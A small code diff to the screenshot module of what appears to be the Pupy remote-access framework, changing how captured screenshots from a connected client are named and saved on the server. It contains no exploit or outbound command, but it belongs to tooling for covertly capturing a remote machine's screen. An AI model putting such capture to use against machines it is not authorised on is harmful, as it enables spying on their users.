@@ -76,7 +76,7 @@ class Screenshoter(PupyModule):
                 return
 
             config = self.client.pupsrv.config or PupyConfig()
-            folder = config.get_folder('screenshots', {'%c': self.client.short_name()})
+            filepath_base = config.get_file('screenshots', {'%c': self.client.short_name()})
 
             screenshots, error = screenshot(args.screen)
             if not screenshots:
@@ -85,7 +85,7 @@ class Screenshoter(PupyModule):
                 self.success('number of monitor detected: %s' % str(len(screenshots)))
 
                 for i, screenshot in enumerate(screenshots):
-                    filepath = path.join(folder, str(datetime.datetime.now()).replace(" ","_").replace(":","-")+'-'+str(i)+".png")
+                    filepath = filepath_base + '-{}.png'.format(i)
                     with open(filepath, 'w') as out:
                         out.write(screenshot)
                         self.success(filepath)
